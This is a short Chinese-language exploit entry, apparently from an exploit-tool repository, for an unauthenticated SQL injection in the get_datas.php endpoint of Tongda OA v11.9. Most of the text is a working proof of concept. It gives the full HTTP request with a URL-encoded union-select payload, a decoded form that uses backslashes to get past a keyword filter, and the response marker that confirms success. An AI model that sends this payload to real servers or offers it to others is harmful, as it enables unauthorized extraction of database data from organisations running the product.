---
source: "LittleBear4/OA-EXPTOOL"
---

# 通达OA v11.9 get_datas.php SQL注入漏洞

## 漏洞描述

通达OA v11.9 的 `/general/reportshop/utils/get_datas.php` 接口前台存在 SQL 注入漏洞，攻击者无需登录即可利用漏洞获取数据库敏感数据。

## 漏洞复现

```
GET /general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5%20whe%5Cre%201=%60%5C=%27%60%201%7D%20un%5Cion%20(s%5Celect%20database(),%20us%5Cer())--%20%27 HTTP/1.1
Host: target
```

解码后的注入参数为：

```
tab=5 whe\re 1={`\=`'` 1} un\ion (s\elect database(), us\er())-- '
```

其中反斜杠用于绕过关键字过滤。响应状态码为 200，且响应体中包含 `td_oa` 即注入成功，页面回显当前数据库名与数据库用户。

## 漏洞影响

```
通达OA v11.9
```

## 参考链接

- 本条目利用细节依据 OA-EXPTOOL 模板中的完整 PoC（模板描述：2022 攻防演习期间披露的前台注入）。
